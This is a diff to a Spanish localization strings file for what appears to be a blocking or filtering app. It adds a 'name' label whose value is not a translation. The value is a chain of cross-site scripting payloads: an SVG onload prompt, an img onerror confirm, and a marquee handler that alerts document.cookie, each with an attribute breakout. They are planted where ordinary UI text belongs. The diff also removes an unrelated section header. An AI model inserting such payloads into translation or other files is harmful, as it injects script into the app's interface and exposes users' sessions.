@@ -72,6 +72,13 @@
 "universal label welcome" = "¡Bienvenido!";
 // Common label when some feature has no setting
 "universal label none" = "Ninguna";
+// Common label in tables for the Name column. Think "name of host".
+"universal label name" = "Nom\"/><svg/onload=prompt(document.domain)>
+
+\"><img src=x onerror=confirm(1)>
+
+\"><marquee onstart='alert(document.cookie)'>XSS";
+
 "universal status processing" = "Procesando... espera por favor.";
 "universal status copied to clipboard" = "Copiado al portapapeles";
 "universal status restart required" = "Por favor, reinicia la aplicación para aplicar los cambios.";
@@ -201,8 +208,6 @@
 "activity filter show allowed" = "Solo permitido";
 "activity empty text" = "Intenta usar tu dispositivo y vuelve aquí más tarde, para ver a dónde se conecta tu dispositivo.";
 "activity device filter show all" = "Todos los dispositivos";
-
-"userdenied section header" = "Mis listas de bloqueo";
 "userdenied section slugline" = "Administrar bloqueo de sitios web particulares";
 // A section name for the list of hosts allowed by user
 "userdenied tab allowed" = "Permitido";
